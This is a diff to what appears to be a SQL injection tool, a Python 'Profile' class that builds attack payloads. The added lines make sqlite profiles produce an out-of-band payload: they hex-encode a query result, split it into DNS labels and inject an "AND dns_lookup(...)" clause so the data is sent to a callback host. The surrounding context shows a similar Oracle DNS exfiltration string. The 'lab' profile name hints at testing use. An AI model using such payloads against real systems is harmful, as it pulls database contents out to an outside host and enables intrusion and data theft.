@@ -111,7 +111,17 @@ class Profile:
                 f"'.{host}/') FROM dual)||'"
             )
 
-        return None  # sqlite: no clean way to embed value in DNS
+        if self.name in ("sqlite-lab", "sqlite-http"):
+            h = f"hex(({expression}))"
+            split = (
+                f"substr({h},1,62)"
+                f"||CASE WHEN length({h})>62 THEN '.'||substr({h},63,62) ELSE '' END"
+                f"||CASE WHEN length({h})>124 THEN '.'||substr({h},125,62) ELSE '' END"
+                f"||CASE WHEN length({h})>186 THEN '.'||substr({h},187,62) ELSE '' END"
+            )
+            return f"{base}' AND dns_lookup({split}||'.{host}')-- -"
+
+        return None
 
     def payload(self, base: str, condition: str, callback_host: str) -> str:
         if self.name == "sqlite-lab":
